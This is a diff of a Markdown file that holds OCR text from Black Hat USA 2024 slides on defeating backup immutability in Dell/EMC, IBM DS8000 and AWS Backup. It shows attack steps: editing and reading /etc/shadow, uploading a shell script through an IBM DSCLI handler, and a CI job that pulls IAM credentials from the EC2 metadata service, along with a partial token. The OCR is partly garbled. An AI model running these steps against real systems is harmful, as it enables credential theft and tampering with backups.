@@ -8,18 +8,24 @@ year: 2024
 source_pdf: "Black Hat USA 2024 slides/Ryan Kane & Rushank Shetty_Are Your Backups Still Immutable, Even Though You Can't Access Them.pdf"
 pages: 48
 sha256: "9b5e0dfd0b3ea517d75e1611812ce12efd310674d9d412181459f468ed8b2a83"
-text_chars: 22537
-ocr_pages: 16
+text_chars: 18655
+ocr_pages: 15
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 88.5
+ocr_unreliable_blocks: 1
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:38:25Z"
+converted_at: "2026-08-12T04:41:15Z"
 ---
 # Are Your Backups Still Immutable, Even Though You Can't Access Them
 
 **Speakers:** Ryan Kane, Rushank Shetty  
 **Conference:** Black Hat USA 2024  
 **Source:** `Black Hat USA 2024 slides/Ryan Kane & Rushank Shetty_Are Your Backups Still Immutable, Even Though You Can't Access Them.pdf` (48 pages)
+
 
 ## Slide 1
 
@@ -143,7 +149,8 @@ Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS80
 
 Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 sysadmin #/system bash enter
@@ -156,14 +163,14 @@ This value remains in effect for four hours after which a new Bash Key signing r
 Enter Bash Key: fj
 On My Mark: Rotate’Ladnich Keys To Launeh HD'Wargames (1983)
 secuser —
-Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 ```
 
 ## Slide 11
 
 Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 sysadmin #/system bash enter
@@ -173,7 +180,6 @@ Username: secuser
 Password:
 Use existing "Bash Key" or/get "Bash Key" from DD-Support /by providing the following Bash Key sig
 This value remains in effect for four hours after which a new Bash Key signing request must be usé
-Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 ```
 
 ## Slide 12
@@ -222,33 +228,26 @@ Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS80
 
 Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bash-4.2#[sed_—i_‘/ddboost/d' etc/shadow |
 sed -i '/ddboost/d' /etc/shadow
 bash-4.2# cat /etc/shadow
 cat /etc/shadow
-EF ake
-bin: *:13223:0:99999:7:
 daemon: *:13223:0:99999
 adm: *:13223:0:99999:7:
 1p:*:13223:0:99999:7:::
-sync: *:13223:0:99999:7::
 mail :*:13223:0:99999:7::
-news :*:13223:0:99999:7::
 uucp :*:13223:0:99999:7::
 operator :*:13223:0:99999
 7s
-27
 games :*:13223:0:99999:
 gopher :*:13223:0:99999
 ftp:*:13223:0:99999:7:
 nobody :*:13223:0:99999:7::
-vesa:x:213214:0:99999:7:::
 rpcuser:x:13214:0:99999:7
 cifsuser:x:13214:0:99999:
-dbus: !!:13214
 sys—internal:x:13214:0:99999
 nfsnobody :x:13214:0:99999:7:
 sysadmin:
@@ -258,14 +257,14 @@ __eseservice__
 __pms_user__
 secuser:
 pentest:
-Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 ```
 
 ## Slide 17
 
 Intro > whoami > Ransomware Groups > Data Immutability > **Dell/EMC** > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 pe DataDomain -U “Storage
@@ -273,8 +272,6 @@ Server
 Server
 Server
 .com (DOWN)
-— aamuncmad j#
-Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 ```
 
 ## Slide 18
@@ -349,7 +346,8 @@ Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Welcome to the Hardware Management Console
@@ -361,16 +359,12 @@ Password
 Logon
 CR © Inspector ©) Console © Debugger TN Network {} Style Ec
 Q Search HTML
-<div class="errormainLyt”™>
 > <div class="pmcLabel"> (=) </div>
 > <div class="pmcField"> (=) </div>
-> <table> (=) </table>
 > <div class="pmcLabel"> (*") </div> |
-> <div class="pmcPassField">(*) </div>
 <input type="hidden” name="j_newConsole” value="No"> §
 > <div style="text-align: left; margin-bottom: 15px;">(=)<] __
 > <div id="tcCheckBoxDiv" style="text-align: left; margin-
-display:none; "> (=) </div>
 wv <div class="loginButton” style="margin-bottom: 15px;">
 </div>
 > <div style="text-align: left;">(=)</div>
@@ -382,7 +376,8 @@ wv <div class="loginButton” style="margin-bottom: 15px;">
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Hardware Management Console
@@ -395,7 +390,6 @@ Welcome ( HNC Version )
 9
 43 service Management
 Buc Management Perform management tasks to set up, configure, and customize operations associated with this HMC.
-i f) Updates
 ? Xf Service Management Perform service tasks to create, customize and manage services associated with this HMC
 |
 {I Updates Perform and manage updates on your system.
@@ -406,31 +400,25 @@ i f) Updates
 | Additional Resources
 | Ej Guided Setup Wizard Provides a step-by-step process to configure your HMC.
 |
-a
 r ie peat and configuring the eve guide Provides an online version of Installing and configuring the HMC v8 guide for system administrators and system operators using the HMC
 : View as HTML
 ; @) ae ine RC ve mute Provides an online version of Managing the HMC v8 guide for system administrators and system operators using the HMC
 View as HIML
-4
 | 2) soning ue eve guide Provides an online version of Servicing the HMC v8 guide for system administrators and system operators using the HMC.
-Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 ```
 
 ## Slide 26
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-1e) & oe https:// | V/hmc/content?taskld= 657 &refresh= 1405 (@) & o2 https://§ = et/nmc/content?taskid=657 &refresh= 1405
 Back Back
 Enter the file name and click OK. The file must exist on the console.
 o OK
-S)
 There was an internal error processing the request.
-ACT@85@2E
-= OA = https:/)_ onl ‘/hme/content?taskld=657 &refresh= 1405
 Back
 Enter the file name and click OK. The file must exist on the console.
 /etc/not_a_real_file
@@ -453,53 +441,21 @@ Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Pretty Raw Hex
-iS |------ WebKitFormBoundaryiamSt8shpSNLI4RP
-24 Content-Disposition: form-data; name="DSCLIFileInput";| filename="ast.sh"|| —
-5 Content-Type: text/x-sh :
-SS #!/bin/bash =
-id
-whoami
-ESSENSE.
-Response
-Pretty Raw Hex Render
-eclluns Cluse
-14
-15 {
-"clazz":"com.ibm.gem.servlets .DSCLIFileUploadHandler$DSCLIFileUploadJSONResult",
-"success":true,
-"fileName": "ast.sh",
-"fileLocation":"/tmp/embeddedDSCLI/74hNp7Zra8zZZO0VifKpcAtC/ast.sh"
-}
-16
-```
-
 ## Slide 29
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Request
 Pretty Raw Hex
-a
-"clazz": "com. ibm.evo.rpc.RPCRequest",
-"methodClazz":"com.ibm.gem.dscli.DSCLIRPC",
 "clazz":"com. ibm.evo.rpc.RP¢
 “messages":[
-1,
-"result" :{
-"clazz":"com.ibm.gem.dscli.beans.DSCLISessionBean",
-"“sessionID":"service_HU6ydx",
-"alive": false,
 “redirectErrorStream":true,
 “output":
 CMNCTOO13E Command: id was not found.\nTip: Enter \"help\" for a list of available commands.\n",
-"currentUser": "service",
 “currentRole":"IBM service"
 ```
 
@@ -507,72 +463,43 @@ CMNCTOO13E Command: id was not found.\nTip: Enter \"help\" for a list of availab
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Request
 Pretty Raw Hex
 20
-21 {
-"clazz":"com. ibm.evo.rpc.RPCRequest",
 "methodClazz":"com.ibm.gem.dscli.DSCLIRPC",
 Response "methodName": "executeDSCLICommand",
-| Pretty Raw Hex "methodArgs":[
-15 { "ryan _uvLwit",
-"clazz": "com. ibm.evo.rpc.RPCResponse"
 "/etc/shadow",
-eee Fe "script'
-’
-"result" :{ ]
-"clazz": "com. ibm.gem.dscli.beans.DS( }
-"sessionID":"ryan_uvLwit",
-"alive": false,
-“redirectErrorStream":true,
-"“exitValue":2,
 "output":
 "CMMCI9013E Command: root:
 >19620:0:99999:7::: was not found.\nTip: Enter \"help\" for a lis
 t of available commands.\n",
-“error :”
 },
-"currentUser": "ryan",
 “currentRole":"Security administrator"
 }
 16
-Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 ```
 
 ## Slide 31
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > **IBM DS8000** > AWS Backup > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 49/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Request
 Pretty Raw Hex
-at
-"clazz": "com. ibm.evo.rpc.RPCRequest",
-“"methodClazz":"com.ibm.gem.dscli.DSCLIRPC",
 "methodName": "removeScript", =
-"“methodArgs":| a
-"7home/ryan/.bashrc" Se ee
-_ Response a eae
-NK tea ; Pretty Raw Hex Render fas
-E has, 114
-2 "clazz":"com.ibm.evo.rpc.RPCResponse",
-"messages":[
->
 "result":{
-"clazz": "com. ibm.gem.dscli.beans.DSCLISessionBean",
 "sessionID":"ryan_uvLwit",
 "alive":false,
-"“redirectErrorStream":true,
 "exitVv "30,
 Froutput": "Script file not found: /home/ryan/.bashrc\n",
-error”:
 },
-“currentUser": "ryan",
 “currentRole":"Security administrator"
 ```
 
@@ -634,11 +561,10 @@ Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 >
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-i a
-Dir $]docker pull : latest
 latest: rutting trom
 6097bfai60c1: Already exists
 28fbabb27267: Already exists
@@ -652,14 +578,14 @@ aca320c6a318: Already exists
 bash-5.1# cat config.json
 {
 “auths": {
-Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 ```
 
 ## Slide 37
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 @ontine 80 Group HE created 2 months ago
@@ -678,7 +604,6 @@ stages: Enter the number of seconds. This timeout takes precedence over lower ti
 - testing
 Tags
 testing:
-stage: testing HE unner
 tags:
 #-
 #-
@@ -687,30 +612,26 @@ You can set up jobs to only use runners with specific tags. Separate tags with c
 #-
 - - runner
 script:
-- wget ee / re leases/latest/download/curl-amd64 -0 curl
 - chmod a+x curl
 ->
 TOKEN="./curl -X PUT “http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"* && ./curl -H "X-aws-ec2-metadata-token: $TOKEN"
 -v
-http://169.254.169.254/latest/meta-data/iam/security-credentials/ i -runner-prod
-Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 ```
 
 ## Slide 38
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 * Closing connection
 "Code" : "Success",
 "LastUpdated" : "2023-12-05T17:34:19Z",
 "Type" : "AWS-HMAC",
-"AccessKeyId" : mo ee
 "Token" : "IQoJb3JpZ2LuX2VjEBLaCXVZLWVhc3QtMSJGMEQCICIAUJNWEBVMOXrxUuzCSwTeOcVui4Y1ZmawIShQy7APAiBk/LqROQAtFh2PTGSF3fgF4
 |
-picky ke ueees {heat dye
 |
 = =
 "Expiration" : "2023-12-05T23:51:55Z"
@@ -718,25 +639,20 @@ picky ke ueees {heat dye
 Vv 69 Cleaning up project directory and file based variables
 71 Job succeeded
 130 « $ aws sts get-caller-identity
-"UserId":
-Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 ```
 
 ## Slide 39
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-BR Management
 Cloud Account HP oc
 Provider ID ooo
-Resource ID servicerolc ia
 Direct Link https://console.aws.amazon.com/iam/home...
 perties (4) Actions (2) Tags (6) Insight Findings
-1
-2 "Version": "2012-10-17",
 3 "Statement": [
 4
 5 "Action": "sts:AssumeRole",
@@ -748,25 +664,23 @@ perties (4) Actions (2) Tags (6) Insight Findings
 12 }
 13 }
 14 ]
-15}
 ID (ARN)
 Region
 Date Discovered
 Latest Harvest
 Related Resources
-arn:aws:iam::_S7:role/or.. O]
 N/A
 2021-07-27
 2024-01-10 (23:22) UTC
 Inline Policies IAM Policy
-Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > AWS Backup > Recommendations > Why test > Q/A
 ```
 
 ## Slide 40
 
 Intro > whoami > Ransomware Groups > Data Immutability > Dell/EMC > IBM DS8000 > **AWS Backup** > Recommendations > Why test > Q/A
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 View Document
